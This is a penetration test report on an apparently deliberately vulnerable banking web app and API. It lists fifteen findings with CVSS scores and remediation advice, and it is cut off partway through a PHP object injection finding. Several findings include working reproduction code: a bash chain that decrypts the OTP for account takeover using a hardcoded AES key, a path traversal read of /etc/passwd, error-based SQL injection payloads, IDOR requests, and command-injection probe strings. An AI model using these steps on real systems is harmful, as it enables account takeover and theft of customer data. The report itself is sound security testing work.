# UnSAFE Bank — Black-Box Web & API Penetration Test Report

**Engagement:** `new2` · black-box re-engagement
**Report date:** 2026-09-21
**Classification:** Confidential — contains working exploitation steps

---

## 1. Engagement overview

| | |
|---|---|
| **Targets** | `http://168.144.155.177:3000` (web UI) · `http://168.144.155.177` (API) |
| **Ports in scope** | **80 and 3000 only** (narrowed by the engagement lead mid-test) |
| **Operator host** | `root@143.244.130.163` (egress verified as `143.244.130.163`) |
| **Workspace** | `/opt/engage-bb2/` · audit log `/opt/engage-bb2/audit.log` (41 logged commands) |
| **Window** | 2026-09-21, 13:58–14:21 UTC (unauthenticated + authenticated phases) |
| **Test type** | Black box — no application source read, no internet research on the target |
| **Decision log** | `engagement-decision-log.md` (per-object rationale, companion to this report) |

### Headline result

**Four Critical issues** were confirmed across two independent attack paths (15 findings in total).

**Unauthenticated:** a **complete account takeover** is possible against any account whose identifier
can be guessed, and **arbitrary files can be read from the API host without authentication**. Both
were proven end to end.

**Authenticated — and this is the shorter path:** because registration is open and unverified, an
attacker can simply sign up and then read customer data at scale by two independent means —
error-based SQL injection (**A1**, confirmed to arbitrary-read depth) and a broken object-level
authorisation flaw returning Aadhaar, PAN, income-tax number, account number and balance for any
`userid` supplied (**A2**). Neither requires
exploiting the takeover chain. Remediation should be sequenced accordingly (§7).

A registered user can additionally achieve **arbitrary file write anywhere on the filesystem**
through PHP object injection (**A7**) — the likely route to full server compromise, and the one
finding not bounded by the database hardening that limits A1.

A reverse proxy is deployed in front of the API but **enforces nothing** — it blocked none of the
attacks below, including every SQL injection payload and every object-injection payload.

### Severity summary

| ID | Finding | Severity | CVSS 3.1 |
|---|---|---|---|
| F1 | Unauthenticated account takeover via OTP disclosure | **Critical** | 9.8 |
| F2 | Unauthenticated arbitrary file read (path traversal) | **High** | 7.5 |
| F3 | Unauthenticated user-enumeration oracle | Medium standalone · **High in chain** | 5.3 base — see rating note |
| F4 | Production source maps expose full client source | Medium | 5.3 |
| F5 | `phpinfo()` exposed at `/info.php` | Medium | 5.3 |
| F6 | Sensitive personal and financial data in the JWT payload | Low | — (observation) |
| F7 | Weak password policy; special characters rejected | Low | 3.7 |
| F8 | Reverse proxy deployed in a non-blocking posture | Low | — (missing control) |
| **A1** | **Authenticated SQL injection — full database read** (`/beneficiary/fetch`) | **Critical** | 9.1 |
| **A2** | **IDOR / BOLA — any customer's KYC and balance** (`/account/details`) | **Critical** | 8.1 |
| **A3** | Transaction-authorisation OTP disclosed to the caller (`/otp/get`) | **High** | 8.1 |
| **A4** | Password change does not verify the current password | **High** | 8.1 |
| **A5** | Beneficiary data not scoped to the authenticated user | **High** | 7.1 |
| **A6** | Verbose PHP errors disclose source paths and line numbers | Medium | 5.3 |
| **A7** | **PHP object injection → arbitrary file write anywhere on the filesystem** (`/loan/apply`) | **Critical** | 9.1 |

---

## 2. Scope and rules of engagement

**In scope:** `168.144.155.177` ports 80 and 3000.

**Out of scope and untouched:** every other port on the target (a full port scan was planned and
then **cancelled** on instruction), any other host, third-party services, mail and DNS infrastructure.

**Constraints honoured:**
- No denial-of-service, load testing or resource exhaustion. All probing was rate-limited with
  1–2 s sleeps between requests.
- No destructive writes to third-party data. Both credential changes performed (F1 step 3 on
  `BNK63993`; A4 on `BNK86310`) were against **accounts created by the tester**. No pre-existing
  account was modified.
- No persistence, backdoors or added credentials on any target. A proof-of-concept that would have
  written a file to the target was designed to avoid persistence and was ultimately **not run** (§8).
- No real user PII copied. The file read stopped at `/etc/passwd`; the SQL injection stopped at
  schema metadata and never queried `account_details`; the IDOR sweep ran only against the tester's
  own five accounts. **One exception, unavoidable and disclosed:** A5 returned four third-party
  beneficiary names and account numbers unprompted, in the baseline response to a normal
  `/beneficiary/list` call. Those records were noted as evidence of the flaw and **not queried
  further**.
- No lateral movement.

**Scope-document discrepancy (raised, unresolved):** the engagement brief's authorization clause
names `example.com` and `api.example.com`, which are not the assets tested. Given prior engagements
against this IP from this operator host, this was treated as template residue and testing proceeded.
**The client should reconcile the authorization document against the IP-based scope.**

---

## 3. Methodology

Phases 1–5 of a standard black-box methodology were executed. Phase 6 (post-exploitation) was
deliberately not entered.

| Phase | Executed | Note |
|---|---|---|
| 1 — Passive recon | Partial | Reverse DNS returned nothing; no public OSINT permitted under the black-box rule |
| 2 — Active scanning | **Reduced** | Full port scan cancelled by instruction; service fingerprinting on ports 80/3000 only |
| 3 — Enumeration | Yes | API surface recovered from target-served source maps rather than brute-forced |
| 3b — Authenticated enumeration | Yes | Added mid-engagement (see deviations); all 22 recovered routes exercised except those noted in §8 |
| 4 — Vulnerability analysis | Yes | Each candidate validated non-destructively before exploitation |
| 5 — Controlled exploitation | Yes | Minimum footprint; own test accounts only. A7 wrote three inert marker files (§9 A) — no executable content at any point |
| 6 — Post-exploitation | **No** | Not authorised; not attempted |

**Tools:** `curl`, `nmap` (available, unused after scope reduction), `python3`, `openssl`, `jq`.
Directory brute force (`ffuf`, `gobuster`) and `nuclei` were available but **deliberately not run** —
the genuine API surface was recovered from client assets, making blind fuzzing unnecessary noise.

### Deviations from plan, and why

1. **Full port scan cancelled** — the engagement lead restricted scope to ports 80 and 3000 mid-test.
2. **Directory brute force skipped** — the complete route table was recovered from source maps (F4).
3. **Authenticated phase added mid-engagement** — the engagement lead extended scope to post-auth
   testing after the unauthenticated phase reported. Findings A1–A6 come from that extension.
4. **Object injection retested after re-authorisation** — the engagement lead confirmed the target
   is a self-hosted deliberately-vulnerable application with no constraint other than no-DoS. The
   `/loan/apply` test was re-run and produced **A7**.
5. **One authenticated test left incomplete** — the negative-amount transfer. Documented with its
   reason in §8; not reported as a finding.

### Prior-knowledge disclosure

Before the black-box rule was set, the tester read `Backend/docker-compose.yml` and the finding
headings of a previous engagement's report during local orientation. All of it was treated as
**untrusted hints only**. Every conclusion in this report was independently re-derived from target
responses or target-served assets; anything not re-derivable was discarded. Notably, the existence
and posture of the reverse proxy (F8) was re-derived from response headers and differential probing,
not read from the compose file.

---

## 4. Findings

### F1 — Unauthenticated account takeover via OTP disclosure · **Critical**

**CVSS 3.1: 9.8** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
Network-reachable, no privileges, no user interaction, full compromise of the target account.

**Affected asset:** `http://168.144.155.177/api/password/forgot`, `/password/verifyuser`, `/password/reset`

**Description and root cause.** The password-reset flow returns the one-time password **to the
caller** in the HTTP response, rather than delivering it out of band to the account owner. The value
is AES-256-CBC encrypted, but the key and IV are hardcoded constants shipped in the publicly served
JavaScript bundle (recovered via F4):

```
secret = 9bbc0d79e686e847bc305c9bd4cc2ea6
iv     = 0123456789abcdef
```

Encryption with a client-side constant is encoding, not a security control. Any unauthenticated
caller can request an OTP for an account, decrypt it, and complete the reset. Root cause: the OTP is
treated as a transport-obfuscated secret instead of an out-of-band authenticator.

**Reproduction.** Replace `BNK63993` with the target account id.

```bash
API=http://168.144.155.177/api
U=BNK63993
env_() { echo "{\"requestBody\":{\"timestamp\":\"325553\",\"device\":{\"deviceid\":\"UHDGGF735SVHFVSX\",\"os\":\"ios\",\"host\":\"lucideustech.com\"},\"data\":$1}}"; }
post() { curl -s -H 'Content-Type: application/json' -X POST "$API/$1" -d "$(env_ "$2")"; }

# 1. request the OTP — no authentication
R=$(post password/forgot "{\"userid\":\"$U\",\"otp_type\":\"4\"}")
BLOB=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["response"])')

# 2. decrypt with the constants from the public bundle
OTP=$(python3 -c "
import sys,base64
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
ct=base64.b64decode(sys.argv[1])
c=Cipher(algorithms.AES(b'9bbc0d79e686e847bc305c9bd4cc2ea6'),modes.CBC(b'0123456789abcdef')).decryptor()
p=c.update(ct)+c.finalize(); print((p[:-p[-1]]).decode())" "$BLOB")

# 3. verify, reset, log in
OR=$(post password/verifyuser "{\"userid\":\"$U\",\"otp\":\"$OTP\"}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["response"])')
post password/reset "{\"userid\":\"$U\",\"otp_response\":\"$OR\",\"new_pass\":\"Reset9876\"}"
post login "{\"userid\":\"$U\",\"passwd\":\"Reset9876\"}"
```

**Evidence** (own test account `BNK63993`, 2026-09-21 ~14:06 UTC):

```
1. {"status":"Success","status_code":"OTP001","message":"OTP Generated Successfully",
    "data":{"response":"mMYWn8CJ3ZHJ2dI02js\/bg=="}}
   decrypted OTP = 563013
2. {"status":"Success","status_code":"OTP003","message":"OTP Verification Successful",
    "data":{"response":"028278265566819"}}
3. {"status":"Success","status_code":"PSW004","message":"Password Reset Successful"}
4. {"status":"Success","status_code":"LGN002","message":"Login Success","data":{"token":"eyJ0eXAi..."}}
```

**Scope of what was proven, and the one inferential step.** The chain was executed end to end against
`BNK63993`, **an account the tester created** — deliberately, since resetting a real customer's
password would be a destructive write to a third party. Strictly, therefore, the *reset* half of the
chain is demonstrated only for an account under the tester's control. Two observations close the gap,
and they are stated here as reasoning rather than as demonstrated fact:

1. The request carries **no caller identity** — `/password/forgot` takes only `userid`, and the
   subsequent steps take only `userid`, `otp` and `otp_response`. There is no session, token or
   signature by which the handler could distinguish the account owner from an attacker.
2. The F3 differential confirms that an **arbitrary existing** `userid` returns the same
   `Success` + `data.response` ciphertext shape as the tester's own account.

Together these make owner-independent behaviour the strongly indicated reading. Confirming it
directly would require resetting a real customer's password, which is out of bounds.

**Business impact.** An unauthenticated attacker takes full control of a customer's banking account —
balance, statements, beneficiaries and transfers — and locks the legitimate owner out by changing
the password. Chained with F3 (enumeration) the attacker does not need to know any account id in
advance. This is a direct route to customer fund loss and to a reportable breach of customer data.

**Remediation.**
- *Short term (hours):* stop returning the OTP in the API response. Remove the `response` field from
  `/password/forgot`. This alone breaks the chain.
- *Long term:* deliver OTPs out of band (SMS/email) only; store them server-side hashed and bound to
  the requesting session; enforce single use, short expiry, and an attempt limit; never place a
  decryption key in client-side code.

**References:** CWE-640 (Weak Password Recovery Mechanism), CWE-321 (Hard-coded Cryptographic Key),
CWE-522, OWASP API Top 10 2023 API2:2023 Broken Authentication, OWASP ASVS V2.

---

### F2 — Unauthenticated arbitrary file read (path traversal) · **High**

**CVSS 3.1: 7.5** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

**Affected asset:** `http://168.144.155.177/api/show`, parameter `file`

**Description and root cause.** `/api/show` serves a file named by the caller-supplied `file`
parameter. Its intended use is `?file=about.html`. The parameter is not canonicalised and is not
constrained to a base directory, so `../` sequences escape the web root. No authentication is
required.

**Reproduction.**

```bash
curl -s --get --data-urlencode 'file=../../../etc/passwd' http://168.144.155.177/api/show
```

**Evidence.** Depths 1–2 returned `HTTP 200` with a 14-byte body; depth 3 disclosed the file:

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
```

Testing stopped at this point — `/etc/passwd` is sufficient proof of arbitrary read, and going
further risked touching application data. **The tester did not retrieve configuration files, and
this report therefore makes no claim about what credentials are reachable** — though see the attack
narrative in §5 for why that is the natural next step for an attacker.

**Business impact.** Any file readable by the web server process can be retrieved by an anonymous
internet user: application configuration, database credentials, framework keys, and any
customer data stored on disk. Confidentiality impact is bounded only by filesystem permissions.

**Remediation.**
- *Short term:* reject any `file` value containing `..`, a leading `/`, or a null byte; better,
  replace the free-form parameter with an allow-list of the handful of documents actually served.
- *Long term:* resolve the requested path with `realpath()` and verify the result is inside the
  intended directory before opening; run the PHP process with least-privilege filesystem access.

**References:** CWE-22 (Path Traversal), CWE-23, OWASP A01:2021 Broken Access Control.

---

### F3 — Unauthenticated user-enumeration oracle · **Medium standalone / High in chain**

**CVSS 3.1 base: 5.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

**Rating note — read this before accepting 5.3.** The base score reflects F3 *in isolation*:
disclosure of which account identifiers exist, which is a low confidentiality impact. That score
understates the real risk here. F3's demonstrated function is to remove the last obstacle to
exercising F1 at scale — it converts a single-account takeover into a sweep of roughly 10⁵
candidates. **Remediation should be prioritised as High**, at the same urgency as F1, because fixing
F1 alone while leaving F3 in place still permits targeted takeover, and fixing F3 alone materially
reduces the blast radius of F1. The base score is published unmodified for comparability; the
contextual rating is what should drive the remediation queue.

**Affected asset:** `http://168.144.155.177/api/password/forgot`

**Description.** The endpoint returns materially different responses for registered and unregistered
identifiers, letting an anonymous caller confirm which account ids exist. Account ids follow the
fixed format `BNK` + five digits (observed in the `/api/signup` response), bounding the search space
at roughly 10⁵ candidates.

**Reproduction / evidence.**

```
userid=BNK63993 (exists)     -> {"status":"Success","status_code":"OTP001","message":"OTP Generated Successfully",...}
userid=BNK00000 (not found)  -> {"status":"Failed","status_code":"PSW002","message":"User not registered"}
userid=ZZZ99999 (not found)  -> {"status":"Failed","status_code":"PSW002","message":"User not registered"}
```

**Scope note.** The differential was established using an account the tester created plus random
non-existent identifiers. **No real username was used to resolve it, and the namespace was not
enumerated.**

**Business impact.** On its own, disclosure of which accounts exist. Chained with F1 it removes the
only remaining obstacle to mass account takeover: an attacker sweeps the `BNK#####` space, keeps the
hits, and takes over each confirmed account.

**Remediation.**
- *Short term:* return an identical generic response for both cases ("If that account exists, an OTP
  has been sent").
- *Long term:* add per-IP and per-account rate limiting with exponential backoff on the reset
  endpoint; consider non-sequential, high-entropy account identifiers.

**References:** CWE-204 (Observable Response Discrepancy), CWE-203, OWASP A07:2021.

---

### F4 — Production source maps expose full client source · **Medium**

**CVSS 3.1: 5.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

**Affected asset:** `http://168.144.155.177:3000/static/js/*.chunk.js.map`

**Description.** JavaScript source maps are served publicly in production, reconstructing the
complete TypeScript/React source — 79 application files including `config/config.ts`, `routes.ts`
and every Redux thunk.

**Reproduction / evidence.**

```bash
curl -sI http://168.144.155.177:3000/static/js/main.f035a24d.chunk.js.map
```

```
main.f035a24d.chunk.js.map  -> HTTP 200, 300,143 bytes
2.20947fb4.chunk.js.map     -> HTTP 200, 4,958,651 bytes
```

**Business impact.** This is the **enabling finding for F1**. The maps handed over the complete API
route table (removing any need for endpoint discovery), the exact request envelope, and — decisively
— the hardcoded AES key and IV that make the OTP disclosure exploitable. Without the maps, F1 would
have required guessing both the endpoint contract and the crypto constants.

**Remediation.**
- *Short term:* stop deploying `.map` files, or block `*.map` at the edge (`location ~ \.map$ { return 404; }`).
- *Long term:* set `GENERATE_SOURCEMAP=false` in the production build; if maps are needed for error
  reporting, upload them to the error-tracking service privately and never to the web root.
  **Note that the AES key must be considered compromised and rotated regardless** — see F1.

**References:** CWE-540 (Inclusion of Sensitive Information in Source Code), OWASP A05:2021.

---

### F5 — `phpinfo()` exposed at `/info.php` · **Medium**

**CVSS 3.1: 5.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

**Affected asset:** `http://168.144.155.177/info.php`

**Description / evidence.** An unauthenticated `HTTP 200` returning 87,825 bytes of `phpinfo()`
output. Related headers on the same host disclose `Server: Apache/2.4.33 (Unix)` and
`X-Powered-By: PHP/7.2.7` — both long past end of life.

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://168.144.155.177/info.php
# 200 87825
```

**Business impact.** `phpinfo()` discloses absolute filesystem paths, loaded extensions, and
environment configuration. Its practical significance here is as an accelerant for F2: it tells an
attacker exactly which absolute paths are worth reading, converting the traversal from guesswork
into a directed retrieval. Separately, PHP 7.2.7 and Apache 2.4.33 are unsupported and carry known
published vulnerabilities.

**Remediation.**
- *Short term:* delete `/info.php` from the web root.
- *Long term:* suppress version banners (`ServerTokens Prod`, `expose_php = Off`); establish a
  patching baseline and move to supported PHP and Apache releases.

**References:** CWE-200 (Information Exposure), CWE-497, OWASP A05:2021 Security Misconfiguration.

---

### F6 — Sensitive personal and financial data in the JWT payload · **Low (observation)**

No CVSS score is asserted. Decoding a JWT payload is trivial once the token is held, and *obtaining*
the token is a separate vector (F1, or a cross-site scripting flaw not assessed here). Scoring this
as an independent vulnerability would misrepresent it; it is a design characteristic that amplifies
other findings, and is reported as such.

**Affected asset:** token returned by `http://168.144.155.177/api/login`

**Description.** The JWT (`alg: HS256`) carries in its base64-encoded — not encrypted — payload:
`acctNo`, `acctBalance`, `incomeTaxNumber`, `aadharId`, `panCardId`, `walletId`, `mobileNo`, `email`,
`dob`, `address`. The token is stored in `localStorage` by the client.

**Evidence.** Decoded from the **tester's own** test-account token. No real customer token was
obtained or decoded.

**Business impact.** A JWT payload is readable by anyone holding the token. Because the client stores
it in `localStorage`, any cross-site scripting flaw — or simple access to the browser profile —
yields a national identity number, tax number, account number and balance in one step. This finding
principally *amplifies* F1: an attacker who takes over an account immediately harvests a complete
identity record.

**Remediation.**
- *Short term:* reduce the payload to an opaque user reference plus authorisation claims; fetch
  profile data from an authenticated endpoint when needed.
- *Long term:* store session tokens in `Secure`, `HttpOnly`, `SameSite` cookies rather than
  `localStorage`; shorten token lifetime (the observed token was valid ~7 days).

**References:** CWE-522, CWE-312 (Cleartext Storage of Sensitive Information), OWASP A02:2021.

---

### F7 — Weak password policy; special characters rejected · **Low**

**CVSS 3.1: 3.7** — `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`

**Affected asset:** `http://168.144.155.177/api/signup`, parameter `passwd`

**Description / evidence.** `PentestPass123!` was **rejected** (`SNUP08 Parameter passwd is invalid
or not set`) while `pentest123` — ten characters, lowercase and digits only — was **accepted**. The
policy therefore forbids special characters while imposing no meaningful complexity floor.

**Business impact.** Rejecting special characters shrinks the keyspace and actively blocks
password-manager-generated passwords, pushing users toward weaker, memorable credentials and making
offline or online guessing more productive.

**Remediation.**
- *Short term:* permit the full printable ASCII range, including spaces.
- *Long term:* adopt NIST SP 800-63B — enforce a minimum length (12+), screen against a breached-password
  corpus, and drop composition rules entirely.

**References:** CWE-521 (Weak Password Requirements), NIST SP 800-63B §5.1.1, OWASP A07:2021.

---

### F8 — Reverse proxy deployed in a non-blocking posture · **Low (missing control)**

No CVSS score is asserted: this is the **absence of a mitigation**, not an exploitable flaw. It is
reported because it explains why every finding above was exploitable without resistance.

**Description.** Port 80 returns two different `Server` tokens depending on who generates the
response — application responses carry `Apache/2.4.33 (Unix)` with `X-Powered-By: PHP/7.2.7`, while
locally-generated 404s carry a bare `Server: Apache`. That divergence identifies a reverse proxy in
front of the PHP origin. Differential probing then established that the proxy **blocks nothing**.

**Evidence.** Identical status and byte count for benign and hostile requests:

```
baseline /api/              -> HTTP 200  31 bytes
' OR 1=1-- -                -> HTTP 200  31 bytes
<script>alert(1)</script>   -> HTTP 200  31 bytes
../../../../etc/passwd      -> HTTP 200  31 bytes
;cat /etc/passwd            -> HTTP 200  31 bytes
User-Agent: sqlmap/1.7      -> HTTP 200  31 bytes
```

Port 3000 behaved identically (2,494 bytes in every case).

**Business impact.** A filtering layer is deployed and running but provides **no attack prevention**.
This is worse than having none, because it can create a false assurance that the application is
shielded. It offers detection value only if its logs are actually monitored and alerted on.

**Remediation.**
- *Short term:* decide explicitly whether this layer is meant to block. If yes, switch the rule
  engine from detection-only to blocking and tune against the resulting false positives. If it is
  intentionally in monitoring mode, confirm its logs reach a monitored destination — otherwise it is
  doing nothing at all.
- *Long term:* a filtering proxy is compensating control, never a substitute for fixing F1–F3.
  Prioritise the code fixes; keep the proxy blocking as defence in depth.

**References:** CWE-693 (Protection Mechanism Failure), OWASP A05:2021.

---

### A1 — Authenticated SQL injection, full database read · **Critical**

**CVSS 3.1: 9.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`
`PR:L` because registration is open and unverified — the "privilege" required is a free self-service
account. `I:L` rather than `I:H`: file-write escalation was measured and ruled out (see below), but
schema-level write grants were not enumerated.

**Affected asset:** `http://168.144.155.177/api/beneficiary/fetch`, parameter `alias`

**Description and root cause.** The `alias` value is concatenated into a SQL statement without
parameterisation. The resulting MySQL error text is reflected verbatim into the response's
`data.alias` field, making this directly exploitable error-based injection — no blind inference
needed.

**Pointer to the broken code path.** The input is **upper-cased server-side** before reaching the
query: `0x3a` arrived as `0X3A` ("Unknown column '0X3A'") and `account_details` as
`ACCOUNT_DETAILS` ("Table 'abstractwallet.ACCOUNT_DETAILS' doesn't exist"). That transformation is
almost certainly a misguided sanitisation step standing in for parameterisation, and it is where the
developer should look first. It is not a control — it was trivially sidestepped with `char(58)` —
but it does explain why time-based payloads (`SLEEP()`) returned in 0 s.

**Reproduction.**

```bash
# 1. authenticate (any account)
# 2. single quote -> raw parser error returned in data.alias
curl -s -H "Authorization: $TOKEN" -H 'Content-Type: application/json' -X POST \
  http://168.144.155.177/api/beneficiary/fetch \
  -d '{"requestBody":{"timestamp":"325553","data":{"alias":"'"'"'"}}}'

# 3. extract arbitrary values via extractvalue()
#    NOTE: the input is upper-cased server-side, which breaks 0x.. hex literals.
#    Use char() instead.
... "alias":"x' AND extractvalue(1,concat(char(58),version()))-- -"
```

**Evidence.**

```
alias = '                      -> "You have an error in your SQL syntax; check the manual that
                                  corresponds to your MySQL server version ... near ''''  AND  user..."
alias = ' OR '1'='1            -> {"alias":"Vipul","accountNumber":"003558008876","ifscCode":"IFSC00009"}
alias = x' UNION SELECT 1-- -  -> "Unknown column 'user_id_fk' in 'field list'"

extractvalue(…,version())      -> XPATH syntax error: ':8.0.19'
extractvalue(…,database())     -> XPATH syntax error: ':abstractwallet'
extractvalue(…,user())         -> XPATH syntax error: ':phpmyadmin@172.19.0.4'
extractvalue(…,count(tables))  -> XPATH syntax error: ':12'
extractvalue(…,first table)    -> XPATH syntax error: ':account_details'
```

**Extraction was deliberately stopped at schema metadata.** Database version, name, DB user and
table inventory establish arbitrary read; querying `account_details` would return real customers'
records and was not done.

**Business impact.** Any registered user — and registration is open and unauthenticated — can read
the banking database: account numbers, balances, and the KYC fields confirmed present in A2
(Aadhaar, PAN, income-tax number). This is a mass data-breach path reachable by anyone willing to
sign up.

**Bounded, by measurement rather than assumption.** The obvious escalation — writing a web shell via
`INTO OUTFILE` — was checked directly and **is not available**:

```
current_user()                  -> phpmyadmin@%
information_schema.user_privileges (global) -> USAGE        (no FILE privilege)
@@global.secure_file_priv       -> NULL                     (SQL file I/O disabled outright)
```

`secure_file_priv = NULL` disables `LOAD_FILE` and `INTO OUTFILE` entirely, and the account holds no
global `FILE` grant. **A1 should therefore be treated as full database read, not as a route to
server compromise.** Schema-level grants on `abstractwallet` were not enumerated, so write access
*within the application's own tables* remains possible and unmeasured — integrity is rated `I:L` for
that reason.

**Remediation.**
- *Short term:* parameterise the `alias` query (prepared statements / CodeIgniter query bindings).
  Stop reflecting database error text into API responses.
- *Long term:* audit every query for concatenation; disable detailed DB errors in production; grant
  the application's DB account least privilege (no `FILE`, no DDL); add a WAF rule set **in blocking
  mode** (F8) as defence in depth.

**References:** CWE-89, OWASP A03:2021 Injection, OWASP API Top 10 API8:2023.

---

### A2 — IDOR / BOLA: any customer's KYC and balance · **Critical**

**CVSS 3.1: 8.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

**Affected asset:** `http://168.144.155.177/api/account/details`, parameter `userid`

**Description and root cause.** The endpoint returns the account identified by the caller-supplied
`data.userid` rather than the identity bound to the bearer token. The token is checked for validity
but never for *authorisation over the requested object*.

**Reproduction.**

```bash
# authenticate as account A, then request account B's userid
curl -s -H "Authorization: $TOKEN_A" -H 'Content-Type: application/json' -X POST \
  http://168.144.155.177/api/account/details \
  -d '{"requestBody":{"timestamp":"325553","data":{"userid":"BNK05446"}}}'
```

**Evidence.** `BNK63993`'s token returned `BNK05446`'s complete record:

```json
{"status":"Success","status_code":"ACT002","data":{
  "accountNumber":"810624178116","accountBalance":"986731.06",
  "incomeTaxNumber":"1191399104","aadharId":"165801857610",
  "panCardId":"8750670230","walletId":"4664900083",
  "mobileNo":"9217322214","email":"…","dob":"1990-01-01","userId":"BNK05446"}}
```

Repeated successfully against `BNK13695`, `BNK23100` and `BNK18664`.

**Scope of what was proven.** All five accounts were created by the tester; the `BNK#####` space was
deliberately *not* swept, to avoid retrieving real customers' KYC. Strictly, therefore, A2 is
demonstrated against tester-created accounts only. Two observations indicate the behaviour is not
limited to them, stated here as reasoning rather than demonstrated fact:

1. The endpoint performs **no owner check at all** — it returns whatever `data.userid` names, and
   there is no branch that could distinguish a tester-created account from a pre-existing one.
2. **A5 independently confirms the backend serves pre-existing third-party records to an unrelated
   caller**: a brand-new account received four other users' beneficiaries and account numbers
   without asking.

Confirming A2 directly against a real customer would mean reading that customer's KYC, which is out
of bounds.

**Business impact.** Combined with F3's enumeration oracle and open registration, one attacker
account is positioned to harvest customer records at scale — national identity numbers (Aadhaar),
tax numbers (PAN), account numbers and live balances. That is mass identity-theft material and, for an Indian
financial institution, a serious regulatory exposure.

**Remediation.**
- *Short term:* ignore `data.userid` entirely; derive the account from the authenticated token.
- *Long term:* enforce object-level authorisation on every endpoint accepting an identifier; add
  automated tests that assert account A cannot read account B.

**References:** CWE-639, CWE-284, OWASP API Top 10 API1:2023 Broken Object Level Authorization.

---

### A3 — Transaction-authorisation OTP disclosed to the caller · **High**

**CVSS 3.1: 8.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N`

**Affected asset:** `http://168.144.155.177/api/otp/get`

**Description.** `/otp/get` exhibits the same flaw as the unauthenticated reset flow (F1) — it
returns the OTP to the caller, encrypted with the same bundle-embedded key — but **this** OTP
authorises beneficiary addition and fund transfer. The step-up authentication protecting money
movement can therefore be self-serviced by whoever holds the session.

**Evidence.**

```
POST /api/otp/get  {"otp_type":"1"}
 -> {"status":"Success","status_code":"OTP001","data":{"response":"c91F6+B4HDvQMqZTt0SfXA=="}}
 -> decrypts with the F1 key/IV; POST /api/otp/verify returns otp_response 941403172847426
```

**Business impact.** OTP step-up exists to ensure a human account holder approves a transaction. An
attacker who has taken over a session (F1) or stolen a token simply mints their own approval, so the
control adds no protection against exactly the scenario it was designed for.

**Remediation.** As F1 — never return the OTP in the response; deliver out of band and verify
server-side.

**Partial mitigation already present:** OTPs *are* bound to a purpose — replaying an `otp_type:1`
approval at `/beneficiary/pay` was rejected with `OTP010 "Invalid use of OTP"`. Preserve that
behaviour when fixing the disclosure.

**References:** CWE-640, CWE-304, OWASP A07:2021.

---

### A4 — Password change does not verify the current password · **High**

**CVSS 3.1: 8.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`

**Affected asset:** `http://168.144.155.177/api/password/change`, parameter `old_pass`

**Description and root cause.** `old_pass` is **required but never validated**. Omitting it returns
a parameter error; supplying any arbitrary string succeeds. The presence check was implemented; the
comparison against the stored credential was not.

**Reproduction / evidence.** A two-request differential makes the root cause unambiguous:

```
{"new_pass":"Changed9999"}                            -> Failed  | ERR002 | One of the request parameters is not set
{"old_pass":"WRONGPASSWORD","new_pass":"Changed9999"} -> Success | PSW008 | Password Changed Successfully
```

**Business impact.** Any temporary control of a session — a stolen token from `localStorage` (F6),
a borrowed device, an XSS payload — becomes **permanent** account takeover, because the attacker can
set a new password without knowing the old one, locking the legitimate owner out. It also removes
the standard defence against session-hijack escalation.

**Remediation.**
- *Short term:* compare `old_pass` against the stored hash and reject on mismatch.
- *Long term:* require re-authentication for credential changes; invalidate all other sessions on
  password change; notify the account holder out of band.

**References:** CWE-620 (Unverified Password Change), OWASP A07:2021, ASVS V2.1.

---

### A5 — Beneficiary data not scoped to the authenticated user · **High**

**CVSS 3.1: 7.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

**Affected asset:** `/api/beneficiary/list`, `/api/beneficiary/get`

**Description.** Beneficiary records are not filtered by owner. A newly created account, which has
added no beneficiaries, is shown other users' payees together with their account numbers.

**Evidence.** `BNK86310` — created minutes earlier, zero beneficiaries added:

```json
/beneficiary/list -> {"alias":["Vipul","John","John","Margarita"]}
/beneficiary/get  -> {"result":["Vipul - 003558008876","John - 703288052038",
                                "John - 812169025520","Margarita - 359502423130"]}
```

Those individuals' records were **not** queried further — they are not accounts the tester created
and may be real.

**Business impact.** Discloses third parties' names and bank account numbers to any registered user.
It also seeds the A-chain: these aliases are directly usable as transfer destinations.

**Remediation.** Filter every beneficiary query by the authenticated user's id; add regression tests
asserting a new account sees an empty list.

**References:** CWE-639, CWE-566, OWASP API1:2023.

---

### A6 — Verbose PHP errors disclose source paths and line numbers · **Medium**

**CVSS 3.1: 5.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

**Description / evidence.** Requests with a missing or empty `Authorization` header return rendered
PHP notices rather than a JSON error:

```html
<h4>A PHP Error was encountered</h4>
<p>Severity: Notice</p>
<p>Message:  Undefined index: token</p>
<p>Filename: models/Model_beneficiary.php</p>
<p>Line Number: 342</p>
<p>Backtrace:</p>
```

Also observed at line `429`. A JSON body sent with an XML content-type returned `HTTP 500`.

**Business impact.** Discloses internal source paths, the MVC layout and exact line numbers, mapping
the application's internals for an attacker. It also indicates unhandled error states — the same
missing-input paths that produced these notices are where injection and logic flaws tend to live.

**Remediation.** Set `display_errors = Off` and the framework environment to `production`; return
structured JSON errors; log detail server-side only.

**References:** CWE-209, CWE-497, OWASP A05:2021.

---

### A7 — PHP object injection → arbitrary file write · **Critical**

**CVSS 3.1: 9.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H`
`PR:L` because registration is open and unverified. `I:H`/`A:H` because the attacker chooses both the
destination path and the content written.

**Affected asset:** `http://168.144.155.177/api/loan/apply`, parameter `type`

**Description and root cause.** The client serialises a PHP object and sends it base64-encoded:

```ts
class LogWrite { public logfile: string|null; public logdata: string }
